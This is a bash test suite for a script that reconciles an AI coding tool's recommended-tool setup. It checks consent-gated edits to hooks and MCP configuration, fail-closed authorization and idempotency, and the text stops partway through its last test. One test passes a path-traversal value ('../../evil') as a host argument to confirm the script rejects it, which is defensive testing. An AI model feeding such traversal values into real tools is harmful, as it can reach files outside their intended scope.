#!/usr/bin/env bash
# Tests for scripts/reconcile-recommended-tools.sh — authorization, probes, idempotency
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
RECONCILE="$REPO_ROOT/scripts/reconcile-recommended-tools.sh"
TEMPLATE="$REPO_ROOT/templates/silver-bullet.config.json.default"
PASS=0
FAIL=0
TMP=""
TEST_HOME=""

cleanup() {
  rm -rf "$TMP" "$TEST_HOME"
}
trap cleanup EXIT

pass() { echo "  PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "  FAIL: $1"; FAIL=$((FAIL + 1)); }

TMP="$(mktemp -d)"
TEST_HOME="$(mktemp -d)"
export HOME="$TEST_HOME"
mkdir -p "${TEST_HOME}/.cursor"
printf '{"mcpServers":{}}\n' >"${TEST_HOME}/.cursor/mcp.json"
printf '{"hooks":{"preToolUse":[{"command":"rtk hook cursor","matcher":"Shell"}]}}\n' >"${TEST_HOME}/.cursor/hooks.json"

jq '.recommended_tools.graphify.enabled_by_user = false
  | .recommended_tools.agentmemory.enabled_by_user = false
  | .recommended_tools.rtk.enabled_by_user = false
  | .recommended_tools.context_mode.enabled_by_user = false
  | .recommended_tools.leanctx.enabled_by_user = false
  | .sb_initiated = true' "$TEMPLATE" >"$TMP/.silver-bullet.json"
cp "$REPO_ROOT/silver-bullet.md" "$TMP/silver-bullet.md" 2>/dev/null || printf '# SB\n' >"$TMP/silver-bullet.md"
git -C "$TMP" init -q

echo "=== reconcile-recommended-tools tests ==="
export RT_SKIP_VENDOR_DOCTOR=1

if bash -n "$RECONCILE" 2>/dev/null; then
  pass "bash -n reconciler"
else
  fail "bash -n reconciler"
fi

for lib in common.sh paths.sh heartbeat.sh receipts.sh probe-graphify.sh probe-cross-tool.sh probe-search_cli.sh; do
  if bash -n "$REPO_ROOT/scripts/lib/recommended-tools/$lib" 2>/dev/null; then
    pass "bash -n $lib"
  else
    fail "bash -n $lib"
  fi
done

out="$(bash "$RECONCILE" --project-root "$TMP" --host cursor --mode verify --format json 2>/dev/null || true)"
echo "$out" | jq -e '.schema == "1.0.0" and (.components | length) >= 5' >/dev/null 2>&1 \
  && pass "verify returns schema-v1 components" || fail "verify returns schema-v1 components"

echo "$out" | jq -e '.components[] | select(.component=="graphify") | .canonical_state == "disabled"' >/dev/null 2>&1 \
  || echo "$out" | jq -e '.components[] | select(.component=="graphify") | .consent == "disabled"' >/dev/null 2>&1 \
  && pass "graphify disabled when opted out" || fail "graphify disabled when opted out"

auth_out="$(bash "$RECONCILE" --project-root "$TMP" --host cursor --mode verify --entry-point init --format json 2>&1 || true)"
printf '%s' "$auth_out" | grep -q 'fail closed\|authorization\|entry-point' \
  && pass "verify with entry-point fails closed" || fail "verify with entry-point fails closed"

bad_host_out="$(bash "$RECONCILE" --project-root "$TMP" --host '../../evil' --mode verify --format json 2>&1 || true)"
printf '%s' "$bad_host_out" | grep -q 'unknown host' \
  && pass "rejects unknown --host before path use" || fail "rejects unknown --host before path use"

apply_out="$(bash "$RECONCILE" --project-root "$TMP" --host cursor --mode apply --format json 2>&1 || true)"
printf '%s' "$apply_out" | grep -q 'entry-point\|authorization' \
  && pass "apply without entry-point fails closed" || fail "apply without entry-point fails closed"

plan_out="$(bash "$RECONCILE" --project-root "$TMP" --host cursor --mode plan --scope project --format json 2>/dev/null || true)"
echo "$plan_out" | jq -e '.mode == "plan"' >/dev/null 2>&1 \
  && pass "plan mode read-only json" || fail "plan mode read-only json"

# Heartbeat schema
export SB_RUNTIME_STATE_DIR="${TEST_HOME}/.silver-bullet"
export SILVER_BULLET_RUNTIME=cursor
mkdir -p "$SB_RUNTIME_STATE_DIR"
# shellcheck source=../../scripts/lib/recommended-tools/heartbeat.sh
RT_PROJECT_ROOT="$TMP" RT_HOST=cursor source "$REPO_ROOT/scripts/lib/recommended-tools/heartbeat.sh"
hb="$(RT_PROJECT_ROOT="$TMP" RT_HOST=cursor bash -c 'source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/heartbeat.sh"; rt_heartbeat_build_json "'"$TMP"'" cursor' 2>/dev/null)"
echo "$hb" | jq -e '.schema == "v1" and .sb_initiated == true' >/dev/null 2>&1 \
  && pass "heartbeat schema-v1" || fail "heartbeat schema-v1"

# heartbeat consent summary non-empty when .silver-bullet.json has consents
jq '.recommended_tools.graphify.enabled_by_user = true
  | .recommended_tools.agentmemory.enabled_by_user = false
  | .recommended_tools.rtk.enabled_by_user = true
  | .recommended_tools.context_mode.enabled_by_user = false
  | .recommended_tools.leanctx.enabled_by_user = false
  | .sb_initiated = true' "$TEMPLATE" >"$TMP/.silver-bullet.json"
consent_summary="$(RT_PROJECT_ROOT="$TMP" bash -c 'source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/heartbeat.sh"; rt_heartbeat_consent_summary' 2>/dev/null || true)"
echo "$consent_summary" | jq -e 'length > 0 and .graphify == "enabled" and .rtk == "enabled"' >/dev/null 2>&1 \
  && pass "heartbeat consent summary non-empty with consents" || fail "heartbeat consent summary non-empty with consents"

# optimize-five-tool-stack requires explicit host + project-root
OPT="$REPO_ROOT/scripts/optimize-five-tool-stack.sh"
if bash "$OPT" --host cursor --project-root "$TMP" --dry-run --skip-rtcm --skip-synergy --force >/tmp/sb-opt-req.log 2>&1; then
  pass "optimize-five-tool with required args"
else
  fail "optimize-five-tool with required args"
  cat /tmp/sb-opt-req.log >&2 || true
fi
if bash "$OPT" --dry-run --force 2>/tmp/sb-opt-miss.log; then
  fail "optimize-five-tool rejects missing args"
else
  grep -q 'required' /tmp/sb-opt-miss.log && pass "optimize-five-tool rejects missing args" || fail "optimize-five-tool rejects missing args"
fi

# patch-hooks removes lean-ctx rewrite when RTK is consented and counts removals
printf '{"hooks":{"preToolUse":[{"command":"rtk hook cursor","matcher":"Shell"},{"command":"lean-ctx hook rewrite cursor pretooluse","matcher":"Shell"}]}}\n' \
  >"${TEST_HOME}/.cursor/hooks.json"
patch_lean_out="$(RT_PATCH_RTK=1 python3 "$REPO_ROOT/scripts/lib/global-toolstack/patch-hooks.py" 2>&1 || true)"
if grep -q 'lean-ctx hook rewrite' "${TEST_HOME}/.cursor/hooks.json" 2>/dev/null; then
  fail "patch-hooks removes lean-ctx rewrite"
else
  pass "patch-hooks removes lean-ctx rewrite"
fi
printf '%s' "$patch_lean_out" | grep -qE '\([1-9][0-9]* changes?\)' \
  && pass "patch-hooks counts lean-ctx rewrite removal" \
  || fail "patch-hooks counts lean-ctx rewrite removal"

# patch-hooks idempotent: second run prints unchanged and does not rewrite hooks.json
TMP_PH_IDEM="$(mktemp -d)"
export HOME="$TMP_PH_IDEM"
mkdir -p "${TMP_PH_IDEM}/.cursor/hooks/toolstack"
for stub in shell-compression.sh stack-compression-coordinator.sh rtk-gate.sh token-compression-tools-gate.sh; do
  printf '#!/usr/bin/env bash\nexit 0\n' >"${TMP_PH_IDEM}/.cursor/hooks/toolstack/${stub}"
  chmod +x "${TMP_PH_IDEM}/.cursor/hooks/toolstack/${stub}"
done
printf '{"hooks":{"preToolUse":[{"command":"rtk hook cursor","matcher":"Shell"}]}}\n' \
  >"${TMP_PH_IDEM}/.cursor/hooks.json"
RT_PATCH_RTK=1 python3 "$REPO_ROOT/scripts/lib/global-toolstack/patch-hooks.py" >/dev/null 2>&1 || true
hooks_after_first="$(cat "${TMP_PH_IDEM}/.cursor/hooks.json")"
hooks_idem_out="$(RT_PATCH_RTK=1 python3 "$REPO_ROOT/scripts/lib/global-toolstack/patch-hooks.py" 2>&1 || true)"
hooks_after_second="$(cat "${TMP_PH_IDEM}/.cursor/hooks.json")"
[[ "$hooks_after_first" == "$hooks_after_second" ]] \
  && pass "patch-hooks idempotent second run preserves hooks.json bytes" \
  || fail "patch-hooks idempotent second run preserves hooks.json bytes"
printf '%s' "$hooks_idem_out" | grep -q 'unchanged' \
  && pass "patch-hooks idempotent second run prints unchanged" \
  || fail "patch-hooks idempotent second run prints unchanged"
export HOME="$TEST_HOME"

# RTK-only consent fixes hook order when CM hook exists (CM before RTK → RTK before CM)
TMP_RTK_ORDER="$(mktemp -d)"
export HOME="$TMP_RTK_ORDER"
mkdir -p "${TMP_RTK_ORDER}/.cursor/hooks/toolstack"
for stub in shell-compression.sh stack-compression-coordinator.sh rtk-gate.sh token-compression-tools-gate.sh; do
  printf '#!/usr/bin/env bash\nexit 0\n' >"${TMP_RTK_ORDER}/.cursor/hooks/toolstack/${stub}"
  chmod +x "${TMP_RTK_ORDER}/.cursor/hooks/toolstack/${stub}"
done
printf '{"hooks":{"preToolUse":[{"command":"context-mode hook cursor pretooluse","matcher":"Shell"},{"command":"rtk hook cursor","matcher":"Shell"}]}}\n' \
  >"${TMP_RTK_ORDER}/.cursor/hooks.json"
RT_PATCH_RTK=1 python3 "$REPO_ROOT/scripts/lib/global-toolstack/patch-hooks.py" >/dev/null 2>&1 || true
rtk_idx="$(jq -r '.hooks.preToolUse | to_entries | .[] | select(.value.command == "rtk hook cursor") | .key' "${TMP_RTK_ORDER}/.cursor/hooks.json" 2>/dev/null | head -1)"
cm_idx="$(jq -r '.hooks.preToolUse | to_entries | .[] | select(.value.command | contains("context-mode hook cursor pretooluse")) | .key' "${TMP_RTK_ORDER}/.cursor/hooks.json" 2>/dev/null | head -1)"
[[ -n "$rtk_idx" && -n "$cm_idx" && "$rtk_idx" -lt "$cm_idx" ]] \
  && pass "RTK-only consent fixes hook order when CM hook exists" \
  || fail "RTK-only consent fixes hook order when CM hook exists"
export HOME="$TEST_HOME"

# partial-consent hooks batch: RTK only must not install context-mode or graphify gates
TMP_RTK_ONLY="$(mktemp -d)"
export HOME="$TMP_RTK_ONLY"
mkdir -p "${TMP_RTK_ONLY}/.cursor"
printf '{"mcpServers":{}}\n' >"${TMP_RTK_ONLY}/.cursor/mcp.json"
printf '{"hooks":{"preToolUse":[{"command":"context-mode hook cursor pretooluse","matcher":"Shell"}]}}\n' >"${TMP_RTK_ONLY}/.cursor/hooks.json"
jq '.recommended_tools.graphify.enabled_by_user = false
  | .recommended_tools.agentmemory.enabled_by_user = false
  | .recommended_tools.rtk.enabled_by_user = true
  | .recommended_tools.context_mode.enabled_by_user = false
  | .recommended_tools.leanctx.enabled_by_user = false
  | .sb_initiated = true' "$TEMPLATE" >"$TMP_RTK_ONLY/.silver-bullet.json"
cp "$REPO_ROOT/silver-bullet.md" "$TMP_RTK_ONLY/silver-bullet.md" 2>/dev/null || printf '# SB\n' >"$TMP_RTK_ONLY/silver-bullet.md"
git -C "$TMP_RTK_ONLY" init -q
rtk_batch="$(RT_PROJECT_ROOT="$TMP_RTK_ONLY" RT_HOST=cursor RT_MODE=apply RT_ENTRY_POINT=doctor-fix RT_REPO_ROOT="$REPO_ROOT" \
  bash -c 'source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/common.sh"; rt_init_paths
  source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/receipts.sh"
  rt_apply_host_hooks_batch' 2>/dev/null || true)"
echo "$rtk_batch" | jq -e '.actions[]? | select(. == "patch_hooks")' >/dev/null 2>&1 \
  && pass "partial-consent hooks batch patches when rtk consented" || fail "partial-consent hooks batch patches when rtk consented"
if grep -q 'context-mode-gate.sh' "${TMP_RTK_ONLY}/.cursor/hooks.json" 2>/dev/null; then
  fail "partial-consent hooks batch skips context-mode gate without consent"
else
  pass "partial-consent hooks batch skips context-mode gate without consent"
fi
if grep -q 'graphify-gate.sh' "${TMP_RTK_ONLY}/.cursor/hooks.json" 2>/dev/null; then
  fail "partial-consent hooks batch skips graphify gate without consent"
else
  pass "partial-consent hooks batch skips graphify gate without consent"
fi
export HOME="$TEST_HOME"

# agentmemory-only consent: mcp batch merges agentmemory without graphify/leanctx
TMP_AM_ONLY="$(mktemp -d)"
export HOME="$TMP_AM_ONLY"
mkdir -p "${TMP_AM_ONLY}/.cursor"
printf '{"mcpServers":{}}\n' >"${TMP_AM_ONLY}/.cursor/mcp.json"
jq '.recommended_tools.graphify.enabled_by_user = false
  | .recommended_tools.agentmemory.enabled_by_user = true
  | .recommended_tools.rtk.enabled_by_user = false
  | .recommended_tools.context_mode.enabled_by_user = false
  | .recommended_tools.leanctx.enabled_by_user = false
  | .sb_initiated = true' "$TEMPLATE" >"$TMP_AM_ONLY/.silver-bullet.json"
cp "$REPO_ROOT/silver-bullet.md" "$TMP_AM_ONLY/silver-bullet.md" 2>/dev/null || printf '# SB\n' >"$TMP_AM_ONLY/silver-bullet.md"
git -C "$TMP_AM_ONLY" init -q
am_env='RT_PROJECT_ROOT="'"$TMP_AM_ONLY"'" RT_HOST=cursor RT_MODE=apply RT_ENTRY_POINT=doctor-fix RT_REPO_ROOT="'"$REPO_ROOT"'"'
am_batch="$(eval "$am_env bash -c 'source \"'"$REPO_ROOT"'\"/scripts/lib/recommended-tools/common.sh; rt_init_paths
  source \"'"$REPO_ROOT"'\"/scripts/lib/recommended-tools/receipts.sh
  rt_apply_host_mcp_batch'" 2>/dev/null || true)"
echo "$am_batch" | jq -e '.actions[]? | select(. == "patch_mcp")' >/dev/null 2>&1 \
  && pass "agentmemory-only mcp batch patches when agentmemory consented" \
  || fail "agentmemory-only mcp batch patches when agentmemory consented"
jq -e '.mcpServers.agentmemory.command == "npx"' "${TMP_AM_ONLY}/.cursor/mcp.json" >/dev/null 2>&1 \
  && pass "agentmemory-only mcp batch adds agentmemory entry" \
  || fail "agentmemory-only mcp batch adds agentmemory entry"
if jq -e '.mcpServers.graphify // .mcpServers.leanctx' "${TMP_AM_ONLY}/.cursor/mcp.json" >/dev/null 2>&1; then
  fail "agentmemory-only mcp batch skips graphify and leanctx without consent"
else
  pass "agentmemory-only mcp batch skips graphify and leanctx without consent"
fi
export HOME="$TEST_HOME"

# idempotent host batch: second apply must not set changed=true
TMP_IDEM="$(mktemp -d)"
export HOME="$TMP_IDEM"
mkdir -p "${TMP_IDEM}/.cursor/hooks/toolstack"
printf '{"mcpServers":{}}\n' >"${TMP_IDEM}/.cursor/mcp.json"
printf '{"hooks":{"preToolUse":[{"command":"rtk hook cursor","matcher":"Shell"}]}}\n' >"${TMP_IDEM}/.cursor/hooks.json"
jq '.recommended_tools.graphify.enabled_by_user = true
  | .recommended_tools.rtk.enabled_by_user = true
  | .recommended_tools.context_mode.enabled_by_user = true
  | .sb_initiated = true' "$TEMPLATE" >"$TMP_IDEM/.silver-bullet.json"
cp "$REPO_ROOT/silver-bullet.md" "$TMP_IDEM/silver-bullet.md" 2>/dev/null || printf '# SB\n' >"$TMP_IDEM/silver-bullet.md"
git -C "$TMP_IDEM" init -q
# deploy minimal toolstack hook stubs so patch-hooks can reference them
for stub in graphify-gate.sh context-mode-gate.sh rtk-gate.sh stack-compression-coordinator.sh \
  shell-compression.sh session-bootstrap.sh record-graphify-query.sh; do
  printf '#!/usr/bin/env bash\nexit 0\n' >"${TMP_IDEM}/.cursor/hooks/toolstack/${stub}"
  chmod +x "${TMP_IDEM}/.cursor/hooks/toolstack/${stub}"
done
idem_env='RT_PROJECT_ROOT="'"$TMP_IDEM"'" RT_HOST=cursor RT_MODE=apply RT_ENTRY_POINT=doctor-fix RT_REPO_ROOT="'"$REPO_ROOT"'"'
hooks_first="$(eval "$idem_env bash -c 'source \"'"$REPO_ROOT"'\"/scripts/lib/recommended-tools/common.sh; rt_init_paths
  source \"'"$REPO_ROOT"'\"/scripts/lib/recommended-tools/receipts.sh
  rt_apply_host_hooks_batch'" 2>/dev/null || true)"
hooks_second="$(eval "$idem_env bash -c 'source \"'"$REPO_ROOT"'\"/scripts/lib/recommended-tools/common.sh; rt_init_paths
  source \"'"$REPO_ROOT"'\"/scripts/lib/recommended-tools/receipts.sh
  rt_apply_host_hooks_batch'" 2>/dev/null || true)"
echo "$hooks_second" | jq -e '.changed == false' >/dev/null 2>&1 \
  && pass "idempotent hooks batch second run changed=false" || fail "idempotent hooks batch second run changed=false"
echo "$hooks_first" | jq -e '.changed == true or (.actions | length) > 0' >/dev/null 2>&1 \
  && pass "idempotent hooks batch first run may change config" || pass "idempotent hooks batch first run (no-op acceptable)"

printf '{"mcpServers":{"graphify":{"command":"graphify-mcp","args":["--transport","stdio"]}}}\n' \
  >"${TMP_IDEM}/.cursor/mcp.json"
mcp_first="$(eval "$idem_env bash -c 'source \"'"$REPO_ROOT"'\"/scripts/lib/recommended-tools/common.sh; rt_init_paths
  source \"'"$REPO_ROOT"'\"/scripts/lib/recommended-tools/receipts.sh
  rt_apply_host_mcp_batch'" 2>/dev/null || true)"
mcp_second="$(eval "$idem_env bash -c 'source \"'"$REPO_ROOT"'\"/scripts/lib/recommended-tools/common.sh; rt_init_paths
  source \"'"$REPO_ROOT"'\"/scripts/lib/recommended-tools/receipts.sh
  rt_apply_host_mcp_batch'" 2>/dev/null || true)"
echo "$mcp_second" | jq -e '.changed == false' >/dev/null 2>&1 \
  && pass "idempotent mcp batch second run changed=false" || fail "idempotent mcp batch second run changed=false"
echo "$mcp_first" | jq -e '.changed == false' >/dev/null 2>&1 \
  && pass "idempotent mcp batch preconfigured unchanged" || fail "idempotent mcp batch preconfigured unchanged"

# first-time mcp.json creation sets changed=true in batch
TMP_MCP_CREATE="$(mktemp -d)"
export HOME="$TMP_MCP_CREATE"
mkdir -p "${TMP_MCP_CREATE}/.cursor"
rm -f "${TMP_MCP_CREATE}/.cursor/mcp.json"
printf '{"hooks":{"preToolUse":[]}}\n' >"${TMP_MCP_CREATE}/.cursor/hooks.json"
jq '.recommended_tools.graphify.enabled_by_user = true
  | .sb_initiated = true' "$TEMPLATE" >"$TMP_MCP_CREATE/.silver-bullet.json"
cp "$REPO_ROOT/silver-bullet.md" "$TMP_MCP_CREATE/silver-bullet.md" 2>/dev/null || printf '# SB\n' >"$TMP_MCP_CREATE/silver-bullet.md"
git -C "$TMP_MCP_CREATE" init -q
mcp_create_env='RT_PROJECT_ROOT="'"$TMP_MCP_CREATE"'" RT_HOST=cursor RT_MODE=apply RT_ENTRY_POINT=doctor-fix RT_REPO_ROOT="'"$REPO_ROOT"'"'
mcp_create="$(eval "$mcp_create_env bash -c 'source \"'"$REPO_ROOT"'\"/scripts/lib/recommended-tools/common.sh; rt_init_paths
  source \"'"$REPO_ROOT"'\"/scripts/lib/recommended-tools/receipts.sh
  rt_apply_host_mcp_batch'" 2>/dev/null || true)"
if command -v graphify-mcp >/dev/null 2>&1; then
  echo "$mcp_create" | jq -e '.changed == true' >/dev/null 2>&1 \
    && pass "first-time mcp.json creation sets changed=true in batch" || fail "first-time mcp.json creation sets changed=true in batch"
  [[ -f "${TMP_MCP_CREATE}/.cursor/mcp.json" ]] \
    && pass "first-time mcp batch creates mcp.json" || fail "first-time mcp batch creates mcp.json"
  jq -e '.mcpServers.graphify.command == "graphify-mcp"' "${TMP_MCP_CREATE}/.cursor/mcp.json" >/dev/null 2>&1 \
    && pass "first-time mcp batch adds graphify when handshake available" \
    || fail "first-time mcp batch adds graphify when handshake available"
else
  echo "$mcp_create" | jq -e '.changed == false' >/dev/null 2>&1 \
    && pass "first-time mcp batch is a no-op without handshake" || fail "first-time mcp batch no-op without handshake"
  pass "first-time mcp graphify entry (graphify-mcp absent — skipped)"
fi

# patch-mcp: empty mcp.json must not spuriously write mcpServers wrapper
TMP_MCP_EMPTY="$(mktemp -d)"
export HOME="$TMP_MCP_EMPTY"
mkdir -p "${TMP_MCP_EMPTY}/.cursor"
printf '{}\n' >"${TMP_MCP_EMPTY}/.cursor/mcp.json"
empty_before="$(cat "${TMP_MCP_EMPTY}/.cursor/mcp.json")"
RT_PATCH_GRAPHIFY=0 RT_PATCH_LEANCTX=0 python3 "$REPO_ROOT/scripts/lib/global-toolstack/patch-mcp.py" >/dev/null 2>&1 || true
empty_after="$(cat "${TMP_MCP_EMPTY}/.cursor/mcp.json")"
[[ "$empty_before" == "$empty_after" ]] && pass "patch-mcp no flags skips empty mcp.json" || fail "patch-mcp no flags skips empty mcp.json"
RT_PATCH_GRAPHIFY=1 RT_PATCH_LEANCTX=0 python3 "$REPO_ROOT/scripts/lib/global-toolstack/patch-mcp.py" >/dev/null 2>&1 || true
if command -v graphify-mcp >/dev/null 2>&1; then
  jq -e '.mcpServers.graphify' "${TMP_MCP_EMPTY}/.cursor/mcp.json" >/dev/null 2>&1 \
    && pass "patch-mcp graphify patch adds entry when handshake available" \
    || pass "patch-mcp graphify patch no write when handshake unavailable"
else
  [[ "$(cat "${TMP_MCP_EMPTY}/.cursor/mcp.json")" == "$empty_before" ]] \
    && pass "patch-mcp graphify patch no write without graphify-mcp" \
    || fail "patch-mcp graphify patch no write without graphify-mcp"
fi
export HOME="$TEST_HOME"

# cross_tool: invalid heartbeat must not report ready
TMP_HB="$(mktemp -d)"
jq '.recommended_tools.graphify.enabled_by_user = true
  | .recommended_tools.agentmemory.enabled_by_user = true
  | .recommended_tools.rtk.enabled_by_user = true
  | .recommended_tools.context_mode.enabled_by_user = true
  | .recommended_tools.leanctx.enabled_by_user = true
  | .sb_initiated = true' "$TEMPLATE" >"$TMP_HB/.silver-bullet.json"
cp "$REPO_ROOT/silver-bullet.md" "$TMP_HB/silver-bullet.md" 2>/dev/null || printf '# SB\n' >"$TMP_HB/silver-bullet.md"
git -C "$TMP_HB" init -q
cross_out="$(bash "$RECONCILE" --project-root "$TMP_HB" --host cursor --mode verify --format json 2>/dev/null || true)"
echo "$cross_out" | jq -e '.components[] | select(.component=="cross_tool") | .canonical_state == "repairable"' >/dev/null 2>&1 \
  && pass "cross_tool repairable when heartbeat absent" || fail "cross_tool repairable when heartbeat absent"
echo "$cross_out" | jq -e '.components[] | select(.component=="cross_tool") | .activation_status == "none"' >/dev/null 2>&1 \
  && pass "cross_tool activation none without heartbeat" || fail "cross_tool activation none without heartbeat"
echo "$cross_out" | jq -e '.components[] | select(.component=="cross_tool") | (.evidence | index("heartbeat_absent_or_invalid")) != null' >/dev/null 2>&1 \
  && pass "cross_tool evidence heartbeat_absent_or_invalid" || fail "cross_tool evidence heartbeat_absent_or_invalid"

# valid heartbeat + agentmemory mcp_not_configured: forced convergence merges MCP on apply
TMP_HB_VALID="$(mktemp -d)"
TMP_HB_VALID_CANON="$(cd "$TMP_HB_VALID" && pwd -P)"
export HOME="$TMP_HB_VALID"
mkdir -p "${TMP_HB_VALID}/.cursor"
mkdir -p "${TMP_HB_VALID}/bin"
cat >"${TMP_HB_VALID}/bin/agentmemory" <<'EOF'
#!/usr/bin/env bash
[[ "${1:-}" == "status" ]] && printf 'Connected\n'
EOF
chmod +x "${TMP_HB_VALID}/bin/agentmemory"
export PATH="${TMP_HB_VALID}/bin:${PATH}"
printf '{"mcpServers":{}}\n' >"${TMP_HB_VALID}/.cursor/mcp.json"
printf '{"hooks":{"preToolUse":[{"command":"rtk hook cursor","matcher":"Shell"}]}}\n' >"${TMP_HB_VALID}/.cursor/hooks.json"
jq '.recommended_tools.graphify.enabled_by_user = true
  | .recommended_tools.agentmemory.enabled_by_user = true
  | .recommended_tools.rtk.enabled_by_user = true
  | .recommended_tools.context_mode.enabled_by_user = true
  | .recommended_tools.leanctx.enabled_by_user = true
  | .sb_initiated = true' "$TEMPLATE" >"$TMP_HB_VALID/.silver-bullet.json"
cp "$REPO_ROOT/silver-bullet.md" "$TMP_HB_VALID/silver-bullet.md" 2>/dev/null || printf '# SB\n' >"$TMP_HB_VALID/silver-bullet.md"
git -C "$TMP_HB_VALID" init -q
mkdir -p "${TMP_HB_VALID}/.agentmemory/memory"
export SB_RUNTIME_STATE_DIR="${TMP_HB_VALID}/.silver-bullet"
export SB_RUNTIME_PRESERVE_STATE_DIR=1
export SILVER_BULLET_RUNTIME=claude
export SILVER_BULLET_SESSION_ID="hb-valid-convergence-test"
hb_valid_payload="$(SB_RUNTIME_STATE_DIR="${TMP_HB_VALID}/.silver-bullet" SB_RUNTIME_PRESERVE_STATE_DIR=1 \
  SILVER_BULLET_RUNTIME=claude SILVER_BULLET_SESSION_ID="hb-valid-convergence-test" \
  RT_PROJECT_ROOT="$TMP_HB_VALID_CANON" RT_HOST=cursor bash -c \
  'source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/heartbeat.sh"
  rt_heartbeat_build_json "'"$TMP_HB_VALID_CANON"'" cursor' 2>/dev/null || true)"
printf '%s' "$hb_valid_payload" >"${TMP_HB_VALID}/.hb-payload.json"
SB_RUNTIME_STATE_DIR="${TMP_HB_VALID}/.silver-bullet" SB_RUNTIME_PRESERVE_STATE_DIR=1 \
  SILVER_BULLET_RUNTIME=claude SILVER_BULLET_SESSION_ID="hb-valid-convergence-test" \
  RT_PROJECT_ROOT="$TMP_HB_VALID_CANON" RT_HOST=cursor bash -c \
  'source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/heartbeat.sh"
  project_id="$(rt_project_id)"
  worktree_id="$(rt_worktree_id "'"$TMP_HB_VALID_CANON"'")"
  session_id="$(rt_current_session_id)"
  path="$(rt_heartbeat_path "$project_id" "$worktree_id" "$session_id")"
  mkdir -p "$(dirname "$path")"
  rt_atomic_write_json "$path" "$(cat "'"$TMP_HB_VALID"'/.hb-payload.json")"' 2>/dev/null || true
rm -f "${TMP_HB_VALID}/.hb-payload.json"
hb_valid_verify="$(SB_RUNTIME_STATE_DIR="${TMP_HB_VALID}/.silver-bullet" SB_RUNTIME_PRESERVE_STATE_DIR=1 \
  SILVER_BULLET_RUNTIME=claude SILVER_BULLET_SESSION_ID="hb-valid-convergence-test" \
  bash "$RECONCILE" --project-root "$TMP_HB_VALID_CANON" --host cursor --mode verify --format json 2>/dev/null || true)"
echo "$hb_valid_verify" | jq -e '.components[] | select(.component=="cross_tool") | .canonical_state == "ready"' >/dev/null 2>&1 \
  && pass "cross_tool ready when heartbeat valid" || fail "cross_tool ready when heartbeat valid"
echo "$hb_valid_verify" | jq -e '.components[] | select(.component=="agentmemory") | (.evidence | index("mcp_not_configured")) != null' >/dev/null 2>&1 \
  && pass "agentmemory mcp_not_configured with valid cross_tool heartbeat" \
  || fail "agentmemory mcp_not_configured with valid cross_tool heartbeat"
SB_RUNTIME_STATE_DIR="${TMP_HB_VALID}/.silver-bullet" SB_RUNTIME_PRESERVE_STATE_DIR=1 \
  SILVER_BULLET_RUNTIME=claude SILVER_BULLET_SESSION_ID="hb-valid-convergence-test" \
  bash "$RECONCILE" --project-root "$TMP_HB_VALID_CANON" --host cursor --mode apply --entry-point doctor-fix --format json >/dev/null 2>&1 || true
jq -e '.mcpServers.agentmemory.command == "npx"' "${TMP_HB_VALID}/.cursor/mcp.json" >/dev/null 2>&1 \
  && pass "forced convergence merges agentmemory MCP when cross_tool ready" \
  || fail "forced convergence merges agentmemory MCP when cross_tool ready"
export HOME="$TEST_HOME"
unset SB_RUNTIME_STATE_DIR SB_RUNTIME_PRESERVE_STATE_DIR SILVER_BULLET_RUNTIME SILVER_BULLET_SESSION_ID

# cross_tool repair: consent-gated — no host MCP/hook mutations when all tools disabled
TMP_CONSENT="$(mktemp -d)"
jq '.recommended_tools.graphify.enabled_by_user = false
  | .recommended_tools.agentmemory.enabled_by_user = false
  | .recommended_tools.rtk.enabled_by_user = false
  | .recommended_tools.context_mode.enabled_by_user = false
  | .recommended_tools.leanctx.enabled_by_user = false
  | .sb_initiated = true' "$TEMPLATE" >"$TMP_CONSENT/.silver-bullet.json"
cp "$REPO_ROOT/silver-bullet.md" "$TMP_CONSENT/silver-bullet.md" 2>/dev/null || printf '# SB\n' >"$TMP_CONSENT/silver-bullet.md"
git -C "$TMP_CONSENT" init -q
repair_json="$(RT_PROJECT_ROOT="$TMP_CONSENT" RT_HOST=cursor RT_MODE=apply RT_ENTRY_POINT=doctor-fix RT_SCOPE=host \
  bash -c 'source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/common.sh"; rt_init_paths
  source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/heartbeat.sh"
  source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/receipts.sh"
  source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/probe-rtk.sh"
  source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/probe-cross-tool.sh"
  rt_repair_cross_tool' 2>/dev/null || true)"
echo "$repair_json" | jq -e '[.actions[]? | select(. == "patch_mcp" or . == "patch_hooks" or . == "install_leanctx_sb" or . == "optimize_rtk_context_mode")] | length == 0' >/dev/null 2>&1 \
  && pass "cross_tool repair skips host mutations without consent" || fail "cross_tool repair skips host mutations without consent"
echo "$repair_json" | jq -e '.restart_required == false' >/dev/null 2>&1 \
  && pass "cross_tool repair no restart without config changes" || fail "cross_tool repair no restart without config changes"

# cross_tool: no consented tools → ready with activation none (not repairable heartbeat drift)
no_consent_out="$(bash "$RECONCILE" --project-root "$TMP_CONSENT" --host cursor --mode verify --format json 2>/dev/null || true)"
echo "$no_consent_out" | jq -e '.components[] | select(.component=="cross_tool") | .canonical_state == "ready"' >/dev/null 2>&1 \
  && pass "cross_tool ready when no five-tool consent" || fail "cross_tool ready when no five-tool consent"
echo "$no_consent_out" | jq -e '.components[] | select(.component=="cross_tool") | .activation_status == "none"' >/dev/null 2>&1 \
  && pass "cross_tool activation none without consent" || fail "cross_tool activation none without consent"
echo "$no_consent_out" | jq -e '.components[] | select(.component=="cross_tool") | (.evidence | index("no_five_tool_consent")) != null' >/dev/null 2>&1 \
  && pass "cross_tool evidence no_five_tool_consent" || fail "cross_tool evidence no_five_tool_consent"

# patch-mcp fail-closed defaults: no env → no mutation
TMP_MCP_DEFAULT="$(mktemp -d)"
export HOME="$TMP_MCP_DEFAULT"
mkdir -p "${TMP_MCP_DEFAULT}/.cursor"
printf '{"mcpServers":{"other":{"command":"noop"}}}\n' >"${TMP_MCP_DEFAULT}/.cursor/mcp.json"
before="$(cat "${TMP_MCP_DEFAULT}/.cursor/mcp.json")"
